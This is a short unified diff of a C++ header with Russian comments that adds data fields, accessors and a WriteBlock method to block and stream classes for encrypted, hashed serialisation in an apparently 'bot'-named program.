@@ -443,7 +443,12 @@ public:
 //************************************************************
 class TDataBlock : public TValue
 {
+private:
+	bool   FDataAssigned;
+	LPVOID FData;
+	DWORD  FSize;
 protected:
+
 	// методы чтения/записи данных
 	bool WriteBuf(LPVOID Buf, DWORD BufSize, bool Crypt, bool Hash);
 	bool ReadBuf(LPVOID Buf, DWORD BufSize, bool Crypt, bool Hash);
@@ -454,9 +459,15 @@ protected:
 	bool virtual ReadHeader();
 	bool virtual ReadData();
 public:
+	DWORD  Type;  // Тип блока
+    string Name;  // Имя блока
+
 	TDataBlock();
 	~TDataBlock();
-    bool SaveToStream(TBotStream *Stream);
+	LPVOID inline Data() { return FData; }
+	DWORD  inline Size() { return FSize; }
+
+//    bool SaveToStream(TBotStream *Stream);
 };
 
 
@@ -474,6 +485,7 @@ private:
 	bool FStreamAssigned;
 	bool WriteHeaders();
 	bool ReadHeaders();
+	bool WriteBlock(TDataBlock &Block);
 protected:
 	bool Write(const void* Buf, DWORD BufSize, bool Encrypt = true, bool Hash = true);
 	bool Read(void* Buf, DWORD BufSize, bool Decrypt = true, bool Hash = true);
